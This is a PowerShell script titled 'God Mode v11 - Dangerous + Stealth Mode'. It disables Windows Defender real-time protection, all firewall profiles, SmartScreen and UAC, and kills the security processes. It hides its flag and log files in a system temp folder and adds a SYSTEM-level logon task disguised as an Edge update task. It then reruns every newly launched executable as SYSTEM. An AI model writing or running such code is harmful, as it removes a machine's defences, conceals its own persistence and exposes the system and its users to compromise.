#Requires -RunAsAdministrator

<#
.SYNOPSIS
    God Mode v11 - Dangerous + Stealth Mode Combined
#>

param(
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$Status,
    [switch]$Launch,
    [switch]$Stealth
)

$FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
$LogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
$TaskBase   = "MicrosoftEdgeUpdateTask_"

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[$Time] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
    if (-not $Stealth -and $Level -ne "STEALTH") {
        Write-Host "[$Time] [$Level] $Message"
    }
}

function Apply-DangerousSettings {
    Write-Log "Applying dangerous settings..." "WARN"

    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force

        # Kill Defender processes
        Get-Process -Name MsMpEng, smartscreen, SecurityHealthService -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Revert-DangerousSettings {
    Write-Log "Reverting settings..." "WARN"
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1 -Force
        Start-Service -Name WinDefend -ErrorAction SilentlyContinue
    } catch {}
}

function Set-Toggle {
    param([bool]$Enabled)
    if ($Enabled) {
        "1" | Out-File $FlagFile -Force
        Apply-DangerousSettings
        Start-StealthMonitor
        Write-Log "God Mode ENABLED (Dangerous + Stealth)" "WARN"
    } else {
        Remove-Item $FlagFile -Force -ErrorAction SilentlyContinue
        Revert-DangerousSettings
        Unregister-ScheduledTask -TaskName $TaskBase* -Confirm:$false -ErrorAction SilentlyContinue
        Write-Log "God Mode DISABLED" "WARN"
    }
}

function Get-Status {
    if (Test-Path $FlagFile) {
        Write-Host "God Mode: ACTIVE (Dangerous + Stealth)" -ForegroundColor Red
    } else {
        Write-Host "God Mode: INACTIVE" -ForegroundColor Yellow
    }
}

function Start-StealthMonitor {
    $randomTask = $TaskBase + (Get-Random -Minimum 10000 -Maximum 99999)
    Unregister-ScheduledTask -TaskName $randomTask -Confirm:$false -ErrorAction SilentlyContinue

    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"
    $Trigger = New-ScheduledTaskTrigger -AtLogon
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $randomTask -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
}

function Elevate-Process {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return }
    try {
        $Action = New-ScheduledTaskAction -Execute $Path
        $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "UpdateTask_" + (Get-Random -Minimum 1000 -Maximum 99999)

        Register-ScheduledTask -TaskName $tempTask -Action $Action -Principal $Principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask
        Start-Sleep -Milliseconds 300
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
    } catch {}
}

function Start-GodMode {
    if (-not (Test-Path $FlagFile)) { return }

    $seen = @{}
    while ($true) {
        Start-Sleep -Seconds 2
        $recent = Get-WmiObject Win32_Process | Where-Object {
            $_.CreationDate -and ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-8)
        }
        foreach ($p in $recent) {
            if ($p.ExecutablePath -like "*.exe" -and -not $seen.ContainsKey($p.ExecutablePath)) {
                $seen[$p.ExecutablePath] = $true
                Elevate-Process $p.ExecutablePath
            }
        }
    }
}

# === CLI ===
if ($ToggleOn)  { Set-Toggle $true; exit }
if ($ToggleOff) { Set-Toggle $false; exit }
if ($Status)    { Get-Status; exit }

if ($Launch) {
    Start-GodMode
}